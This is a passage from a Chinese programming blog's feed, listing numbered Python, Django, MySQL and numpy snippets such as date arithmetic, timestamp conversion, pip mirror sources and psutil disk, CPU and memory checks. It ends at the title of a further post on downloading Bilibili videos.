class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from datetime import datetime</span><br><span class="line">    </span><br><span class="line">def get_months(start_month_str, end_month_str):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    # 获取时间字符串中的月份数</span><br><span class="line">    :param start_month_str: 开始字符串</span><br><span class="line">    :param end_month_str: 结束字符串</span><br><span class="line">    :return: 月份数</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    end_month_date = datetime.strptime(end_month_str, &#x27;%Y-%m&#x27;)</span><br><span class="line">    start_month_date = datetime.strptime(start_month_str, &#x27;%Y-%m&#x27;)</span><br><span class="line">    end_year, end_month = end_month_date.year, end_month_date.month</span><br><span class="line">    start_year, start_month = start_month_date.year, start_month_date.month</span><br><span class="line"></span><br><span class="line">    return (end_year - start_year) *12 + (end_month - start_month) + 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">end_month_str = &#x27;2021-02&#x27;</span><br><span class="line">start_month_str = &#x27;2020-07&#x27;</span><br><span class="line">print(get_months(start_month_str, end_month_str))</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line">8</span><br></pre></td></tr></table></figure><h2 id="106、字符串不足补零"><a href="#106、字符串不足补零" class="headerlink" title="106、字符串不足补零"></a>106、字符串不足补零</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;hello world&#x27;.zfill(15)) # 补0</span><br><span class="line">print(&#x27;hello world&#x27;.rjust(15)) # 右对齐，补空格</span><br><span class="line">print(&#x27;hello world&#x27;.ljust(15)) # 左对齐，补空格</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line">0000hello world</span><br><span class="line">    hello world</span><br><span class="line">hello world  </span><br></pre></td></tr></table></figure><h2 id="107、时间戳转字符串日期"><a href="#107、时间戳转字符串日期" class="headerlink" title="107、时间戳转字符串日期"></a>107、时间戳转字符串日期</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">t1 = time.time()</span><br><span class="line"><span class="built_in">print</span>(t1)</span><br><span class="line"><span class="built_in">print</span>(time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, time.localtime(t1)))</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="number">1621741567.082192</span></span><br><span class="line"><span class="number">2021</span>-05-<span class="number">23</span> <span class="number">11</span>:<span class="number">46</span>:07</span><br></pre></td></tr></table></figure><p>使用函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"># !/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">@contact: 微信 1257309054</span><br><span class="line">@file: 时间戳转日期.py</span><br><span class="line">@time: 2022/6/27 17:16</span><br><span class="line">@author: LDC</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import time</span><br><span class="line">import datetime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 正确10位长度的时间戳可精确到秒，11-14位长度则是包含了毫秒</span><br><span class="line">def int_to_datetime(intValue):</span><br><span class="line">    if len(str(intValue)) == 10:</span><br><span class="line">        # 精确到秒</span><br><span class="line">        timeValue = time.localtime(intValue)</span><br><span class="line">        tempDate = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, timeValue)</span><br><span class="line">        datetimeValue = datetime.datetime.strptime(tempDate, &quot;%Y-%m-%d %H:%M:%S&quot;)</span><br><span class="line">    elif 10 &lt; len(str(intValue)) and len(str(intValue)) &lt; 15:</span><br><span class="line">        # 精确到毫秒</span><br><span class="line">        k = len(str(intValue)) - 10</span><br><span class="line">        timetamp = datetime.datetime.fromtimestamp(intValue / (1 * 10 ** k))</span><br><span class="line">        datetimeValue = timetamp.strftime(&quot;%Y-%m-%d %H:%M:%S.%f&quot;)</span><br><span class="line">    else:</span><br><span class="line">        return -1</span><br><span class="line">    return datetimeValue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">time1 = 1656321420</span><br><span class="line">time2 = 1656321086560</span><br><span class="line">print(int_to_datetime(time1))</span><br><span class="line">print(int_to_datetime(time2))</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">输出：</span><br><span class="line">2022-06-27 17:17:00</span><br><span class="line">2022-06-27 17:11:26.560000</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h2 id="108、列表转字符串"><a href="#108、列表转字符串" class="headerlink" title="108、列表转字符串"></a>108、列表转字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;,&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,a)))</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">`<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>`</span><br></pre></td></tr></table></figure><h2 id="109、pip国内镜像源"><a href="#109、pip国内镜像源" class="headerlink" title="109、pip国内镜像源"></a>109、pip国内镜像源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pip install 库名 -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">清华：-i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line">阿里云：-i http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"></span><br><span class="line">中国科技大学 -i https://pypi.mirrors.ustc.edu.cn/simple/</span><br><span class="line"></span><br><span class="line">华中理工大学：-i http://pypi.hustunique.com/</span><br><span class="line"></span><br><span class="line">山东理工大学：-i http://pypi.sdutlinux.org/ </span><br><span class="line"></span><br><span class="line">豆瓣：-i http://pypi.douban.com/simple/</span><br></pre></td></tr></table></figure><h2 id="110、python把时间字符串转换成刚刚、1天前、3个月前、1年前"><a href="#110、python把时间字符串转换成刚刚、1天前、3个月前、1年前" class="headerlink" title="110、python把时间字符串转换成刚刚、1天前、3个月前、1年前"></a>110、python把时间字符串转换成刚刚、1天前、3个月前、1年前</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import datetime</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def date_interval(date_str):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    获取时间间隔</span><br><span class="line">    1分钟前，2分钟前，10分钟前，1小时前，2小时前，1天前，2天前，3天前，1个月前，3个月前，1年前，3年前</span><br><span class="line">    :param date_str: 时间字符串</span><br><span class="line">    :return: 字符串</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    date_str = time.strptime(date_str, &#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class="line">    # 将时间元组转换为时间戳</span><br><span class="line">    t = time.mktime(date_str)</span><br><span class="line"></span><br><span class="line">    # 当前时间</span><br><span class="line">    seconds = time.time() - t</span><br><span class="line"></span><br><span class="line">    years = int(seconds // (60 * 60 * 24 * 365))</span><br><span class="line">    if years:</span><br><span class="line">        return &#x27;&#123;&#125;年前&#x27;.format(years)</span><br><span class="line">    months = int(seconds // (60 * 60 * 24 * 30))</span><br><span class="line">    if months:</span><br><span class="line">        return &#x27;&#123;&#125;月前&#x27;.format(months)</span><br><span class="line">    days = int(seconds // (60 * 60 * 24))</span><br><span class="line">    if days:</span><br><span class="line">        return &#x27;&#123;&#125;天前&#x27;.format(days)</span><br><span class="line">    hours = int(seconds // (60 * 60))</span><br><span class="line">    if hours:</span><br><span class="line">        return &#x27;&#123;&#125;小时前&#x27;.format(hours)</span><br><span class="line">    minutes = int(seconds // (60))</span><br><span class="line">    if minutes:</span><br><span class="line">        return &#x27;&#123;&#125;分钟前&#x27;.format(minutes)</span><br><span class="line">    return &#x27;刚刚&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    date1 = &#x27;2019-07-10 15:27:51&#x27;</span><br><span class="line">    date2 = &#x27;2021-07-10 15:27:51&#x27;</span><br><span class="line">    date3 = &#x27;2021-08-10 15:27:51&#x27;</span><br><span class="line">    date4 = &#x27;2021-08-12 11:01:51&#x27;</span><br><span class="line">    date5 = datetime.datetime.now() + datetime.timedelta(seconds=-3)</span><br><span class="line">    date5 = date5.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class="line">    print(date_interval(date1))</span><br><span class="line">    print(date_interval(date2))</span><br><span class="line">    print(date_interval(date3))</span><br><span class="line">    print(date_interval(date4))</span><br><span class="line">    print(date_interval(date5))</span><br></pre></td></tr></table></figure><h2 id="111、Django使用ORM执行sql语句"><a href="#111、Django使用ORM执行sql语句" class="headerlink" title="111、Django使用ORM执行sql语句"></a>111、Django使用ORM执行sql语句</h2><p>通过raw函数执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">alarm_datas = gsm.AlertMessage.objects.raw(&#x27;&#x27;&#x27;</span><br><span class="line">                select am_all.id, am_all.sensor_number</span><br><span class="line">                    FROM alert_message as am_all</span><br><span class="line">                    where </span><br><span class="line">                        am_all.real=&#x27;1&#x27;</span><br><span class="line">                        and am_all.is_show=1</span><br><span class="line">                    order by am_all.alarm_level desc</span><br><span class="line">                &#x27;&#x27;&#x27;)</span><br><span class="line">for ad in alarm_datas:</span><br><span class="line">print(ad.sensor_number)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="112、Django通过变量字段获取数据"><a href="#112、Django通过变量字段获取数据" class="headerlink" title="112、Django通过变量字段获取数据"></a>112、Django通过变量字段获取数据</h2><p>通过方法<code>__getattribute__</code>来获取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alert_messages = AlertMessage.objects.filter(real=0)</span><br><span class="line">am_fields = [&#x27;id&#x27;, &#x27;real&#x27;, &#x27;name&#x27;]</span><br><span class="line">for am in alert_messages:</span><br><span class="line">for i in range(len(am_fields)):</span><br><span class="line">print(am_fields[i], am.__getattribute__(am_fields[i]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="113、Django查询变量字段、更新变量字段"><a href="#113、Django查询变量字段、更新变量字段" class="headerlink" title="113、Django查询变量字段、更新变量字段"></a>113、Django查询变量字段、更新变量字段</h2><p>通过<code>**&#123;变量名:值&#125;</code>来操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">field = &#x27;device_code&#x27;</span><br><span class="line"># 查询</span><br><span class="line">device_infos = gsm.DeviceInfo.objects.filter(**&#123;field: &#x27;012&#x27;&#125;)</span><br><span class="line"># 更新</span><br><span class="line">gsm.DeviceInfo.objects.filter(device_code=&#x27;012&#x27;).update(**&#123;field : &#x27;0&#x27;&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="114、vue生成dist文件"><a href="#114、vue生成dist文件" class="headerlink" title="114、vue生成dist文件"></a>114、vue生成dist文件</h2><p>安装npm，到<a href="https://nodejs.org/en/download/">官网下载</a><br>在vue项目下打开cmd，输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure><p>如果报错，npm ERR! missing script: build，<br>则使用以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build:prod</span><br></pre></td></tr></table></figure><p>具体看package.json</p><p><img src="https://img-blog.csdnimg.cn/eff15dcd4c1d499f9641d0ac25c09bc0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Lic5pyo5pyI,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="115、python获取电脑磁盘、CPU、内存使用情况"><a href="#115、python获取电脑磁盘、CPU、内存使用情况" class="headerlink" title="115、python获取电脑磁盘、CPU、内存使用情况"></a>115、python获取电脑磁盘、CPU、内存使用情况</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import psutil</span><br><span class="line">#  pip install psutil</span><br><span class="line"></span><br><span class="line"># 获取本机磁盘使用率和剩余空间G信息</span><br><span class="line">def get_disk_info():</span><br><span class="line">    # 循环磁盘分区</span><br><span class="line">    content = &quot;&quot;</span><br><span class="line">    for disk in psutil.disk_partitions():</span><br><span class="line">        # 读写方式 光盘 or 有效磁盘类型</span><br><span class="line">        if &#x27;cdrom&#x27; in disk.opts or disk.fstype == &#x27;&#x27;:</span><br><span class="line">            continue</span><br><span class="line">        disk_name_arr = disk.device.split(&#x27;:&#x27;)</span><br><span class="line">        disk_name = disk_name_arr[0]</span><br><span class="line">        disk_info = psutil.disk_usage(disk.device)</span><br><span class="line">        # 磁盘剩余空间，单位G</span><br><span class="line">        free_disk_size = disk_info.free//1024//1024//1024</span><br><span class="line">        # 当前磁盘使用率和剩余空间G信息</span><br><span class="line">        info = &quot;&#123;&#125;盘使用率：&#123;&#125;%%， 剩余空间：&#123;&#125;G &quot;.format(disk_name, str(disk_info.percent), free_disk_size)</span><br><span class="line">        # 拼接多个磁盘的信息</span><br><span class="line">        content = content + info</span><br><span class="line">    print(content)</span><br><span class="line"></span><br><span class="line"># cpu信息</span><br><span class="line">def get_cpu_info():</span><br><span class="line">    cpu_percent = psutil.cpu_percent(interval=1)</span><br><span class="line">    cpu_info = &quot;CPU使用率：%i%%&quot; % cpu_percent</span><br><span class="line">    print(cpu_info)</span><br><span class="line"></span><br><span class="line"># 内存信息</span><br><span class="line">def get_memory_info():</span><br><span class="line">    virtual_memory = psutil.virtual_memory()</span><br><span class="line">    used_memory = virtual_memory.used/1024/1024/1024</span><br><span class="line">    free_memory = virtual_memory.free/1024/1024/1024</span><br><span class="line">    memory_percent = virtual_memory.percent</span><br><span class="line">    memory_info = &quot;内存使用：%0.2fG，使用率%0.1f%%，剩余内存：%0.2fG&quot; % (used_memory, memory_percent, free_memory)</span><br><span class="line">    print(memory_info)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    get_disk_info()</span><br><span class="line">    get_cpu_info()</span><br><span class="line">    get_memory_info()</span><br></pre></td></tr></table></figure><h2 id="116、max比较字典列表"><a href="#116、max比较字典列表" class="headerlink" title="116、max比较字典列表"></a>116、max比较字典列表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">使用max函数比较字典列表对象</span><br><span class="line">需求：找出用户组最大id的字典</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">def com_id(f):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    比较用用户ids列表</span><br><span class="line">    :param f: 字典</span><br><span class="line">    :return: 返回最大的用户id</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    return max(f[&#x27;user_ids&#x27;])</span><br><span class="line"></span><br><span class="line">friends_added = [</span><br><span class="line">        &#123;&#x27;user_ids&#x27;: [1, 2], &#x27;create_at&#x27;: &#x27;2020-01-01&#x27;&#125;,</span><br><span class="line">        &#123;&#x27;user_ids&#x27;: [3, 6], &#x27;create_at&#x27;: &#x27;2020-01-02&#x27;&#125;,</span><br><span class="line">        &#123;&#x27;user_ids&#x27;: [2, 1], &#x27;create_at&#x27;: &#x27;2020-02-02&#x27;&#125;,</span><br><span class="line">        &#123;&#x27;user_ids&#x27;: [4, 1], &#x27;create_at&#x27;: &#x27;2020-02-02&#x27;&#125;,</span><br><span class="line">    ]</span><br><span class="line"># max函数中使用key参数，指定自定义函数来比较</span><br><span class="line">item = max(friends_added, key=com_id)</span><br><span class="line">item_1 = max(friends_added, key=lambda f: max(f[&#x27;user_ids&#x27;])) # com_id可以转成lambda函数</span><br><span class="line">print(item)</span><br><span class="line">print(item_1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line">&#123;&#x27;user_ids&#x27;: [3, 6], &#x27;create_at&#x27;: &#x27;2020-01-02&#x27;&#125;</span><br><span class="line">&#123;&#x27;user_ids&#x27;: [3, 6], &#x27;create_at&#x27;: &#x27;2020-01-02&#x27;&#125;</span><br></pre></td></tr></table></figure><h2 id="117、django查询表的具体字段"><a href="#117、django查询表的具体字段" class="headerlink" title="117、django查询表的具体字段"></a>117、django查询表的具体字段</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ExampleModel.objects.values(&#x27;id&#x27;, &#x27;username&#x27;)</span><br><span class="line"># 返回的结果是QuerySet， 里面的元素是dict格式</span><br><span class="line"># [&#123;&#x27;id&#x27;:1, &#x27;username&#x27;: &#x27;Austin&#x27;&#125;, &#123;&#x27;id&#x27;:2, &#x27;username&#x27;:&#x27;Sam&#x27;&#125;, ...]</span><br><span class="line"># 相当于SQL中的SELECT id, username FROM ......, </span><br><span class="line"># 只返回对应属性（字段）的值</span><br></pre></td></tr></table></figure><h2 id="118、MySQL查询数据添加自增序号"><a href="#118、MySQL查询数据添加自增序号" class="headerlink" title="118、MySQL查询数据添加自增序号"></a>118、MySQL查询数据添加自增序号</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @i = 0;</span><br><span class="line">select waveform, &#x27;沿桥风吹&#x27; as label ,(@i:=@i+1) xh from alert_message where is_real=1 and node_id=138</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="119、MySQL-时间截取年月日"><a href="#119、MySQL-时间截取年月日" class="headerlink" title="119、MySQL 时间截取年月日"></a>119、MySQL 时间截取年月日</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select id,</span><br><span class="line">addtime, </span><br><span class="line">date_format(addtime,&#x27;%Y-%m-%d&#x27;) as short_time </span><br><span class="line">from alert_message </span><br><span class="line">where date_format(addtime,&#x27;%Y-%m-%d&#x27;) = &#x27;2022-03-13&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/37cec67fa1e1458f9aba1b745600a493.png" alt="在这里插入图片描述"></p><h2 id="120、-列表取奇数下标值"><a href="#120、-列表取奇数下标值" class="headerlink" title="120、 列表取奇数下标值"></a>120、 列表取奇数下标值</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">list1=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;奇数下标值&#x27;</span>,list1[<span class="number">1</span>::<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line">奇数下标值 [<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="121、列表取偶数下标值"><a href="#121、列表取偶数下标值" class="headerlink" title="121、列表取偶数下标值"></a>121、列表取偶数下标值</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list1=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;偶数下标值&#x27;</span>,list1[::<span class="number">2</span>])</span><br><span class="line">偶数下标值 [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;e&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="122、列表相同元素分类、分组"><a href="#122、列表相同元素分类、分组" class="headerlink" title="122、列表相同元素分类、分组"></a>122、列表相同元素分类、分组</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">data = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>]</span><br><span class="line">a =[<span class="built_in">list</span>(group) <span class="keyword">for</span> key, group <span class="keyword">in</span> itertools.groupby(data)]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line">[[<span class="number">1</span>], [<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>], [<span class="number">1</span>], [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>]]</span><br></pre></td></tr></table></figure><h2 id="123、ubuntu切换用户"><a href="#123、ubuntu切换用户" class="headerlink" title="123、ubuntu切换用户"></a>123、ubuntu切换用户</h2><p>1）从user用户切换到root用户<br>sudo su<br>2）从root用户切回user用户<br>su user (user是你自己安装时候的用户名)，或是直接输入exit，也可Ctrl+D组合键推出</p><h2 id="124、numpy二维数组获取某一列"><a href="#124、numpy二维数组获取某一列" class="headerlink" title="124、numpy二维数组获取某一列"></a>124、numpy二维数组获取某一列</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">a = [</span><br><span class="line">    [1, 2, 3, 4, 5, 6],</span><br><span class="line">    [7, 8, 9, 10, 11, 12],</span><br><span class="line">    [13.2, 14.8, 15.9, 16.10, 16.11, 17.12],</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">a_np = np.array(a)  # 把二维列表转成numpy数组</span><br><span class="line">print(&#x27;第一行&#x27;, a_np[0].tolist())  # 获取第一行</span><br><span class="line">print(&#x27;第一列&#x27;, a_np[:, 0].tolist())  # 获取第一列</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line">第一行 [1.0, 2.0, 3.0, 4.0, 5.0, 6.0]</span><br><span class="line">第一列 [1.0, 7.0, 13.2]</span><br></pre></td></tr></table></figure><div>  点击下载博客:  <div style="display: flex;    justify-content: center;">      <a href="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/md/python%E7%BB%84%E4%BB%B6%E5%BA%93%E5%88%86%E4%BA%AB.md">    <i class="fa fa-download fa-2x" aria-hidden="true"></i>    </a>  </div>  </div>]]></content>
      
      
      
        <tags>
            
            <tag> 组件库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对B站视频爬取下载，并组合成完整的视频</title>
      <link href="/2021/11/12/%E5%AF%B9B%E7%AB%99%E8%A7%86%E9%A2%91%E7%88%AC%E5%8F%96%E4%B8%8B%E8%BD%BD%EF%BC%8C%E5%B9%B6%E7%BB%84%E5%90%88%E6%88%90%E5%AE%8C%E6%95%B4%E7%9A%84%E8%A7%86%E9%A2%91/"/>
